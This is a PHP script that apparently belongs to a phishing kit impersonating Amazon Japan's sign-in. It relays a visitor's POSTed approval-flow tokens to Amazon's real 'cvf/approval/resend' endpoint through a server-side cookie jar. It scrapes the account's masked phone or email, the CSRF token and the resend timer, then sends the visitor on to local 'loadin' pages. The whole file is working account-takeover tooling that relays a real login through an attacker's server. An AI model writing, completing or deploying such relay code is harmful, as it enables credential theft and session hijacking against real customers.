
<?php
include '../../php/xzpc.php';
$goArray = array(
    "arb"=>$_POST["arb"],
    "openid.return_to"=>$_POST["openid_return_to"],
    "pageId"=>$_POST["pageId"],
    "openid.assoc_handle"=>$_POST["openid_assoc_handle"],
    "csrfToken"=>$_POST["csrfToken"]
);
//print_r(http_build_query($goArray));


session_start();
$cookieSuccess = $_SESSION["cookiesuccess"]?$_SESSION["cookiesuccess"]:"./cookies/".md5(time().rand(10000,99999)).".cookie";
$_SESSION["cookiesuccess"] = $cookieSuccess;
$cookieSuccess = "../.".$cookieSuccess;

$url = "https://www.amazon.co.jp/ap/cvf/approval/resend";

include '../../php/curl.php';
$result = post_curl($cookieSuccess,$url,$goArray,true,("https://www.amazon.co.jp/ap/cvf/approval?arb=".$goArray["arb"]."&openid.assoc_handle=".$goArray["openid.assoc_handle"]."&pageId=".$goArray["pageId"]."&openid.return_to=".$goArray["openid.return_to"]));




if(strpos($result,'a-column a-span8 a-text-left a-span-last')!==false){
    
    
    preg_match_all("/\"a-column a-span4 a-text-left\">(.*?)</i", $result, $phone_email_text);
    
    preg_match_all("/\"a-column a-span8 a-text-left a-span-last\">(.*?)</i", str_replace(PHP_EOL, '', $result), $phone_email_number);
    
    preg_match_all("/\"arb\" value=\"(.*?)\"/i", $result, $arb);
    
    preg_match_all("/\"openid.return_to\" value=\"(.*?)\"/i", $result, $openid_return_to);
    
    preg_match_all("/\"pageId\" value=\"(.*?)\"/i", $result, $pageId);
    
    preg_match_all("/\"openid.assoc_handle\" value=\"(.*?)\"/i", $result, $openid_assoc_handle);
    
    preg_match_all("/'csrfToken' value='(.*?)'/i", $result, $csrfToken);
    
    
    preg_match_all("/resendApprovalLinksTimer\) \{        if \((.*?)\)/i", str_replace(PHP_EOL, '', $result), $isresendTimer);
    preg_match_all("/resendApprovalLinksTimer.createTimer\((.*?) - D/i", str_replace(PHP_EOL, '', $result), $timeleft);
    
    
    $_SESSION['loadinInfo'] = array(
        'phone_email_text'=>$phone_email_text[1][0],
        'phone_email_number'=>$phone_email_number[1][0],
        'arb'=>$arb[1][0],
        'openid_return_to'=>$openid_return_to[1][0],
        'pageId'=>$pageId[1][0],
        'openid_assoc_handle'=>$openid_assoc_handle[1][0],
        'csrfToken'=>$csrfToken[1][0],
        'isresendTimer'=>$isresendTimer[1][0],
        'timeleft'=>$timeleft[1][0]
    );
    if(is_mobile_request()){
        header("location: ./loadinm.php");
        exit;
    }
    header("location: ./loadin.php");
    exit;
}
//echo($result);
header("location: /signin.php");


?>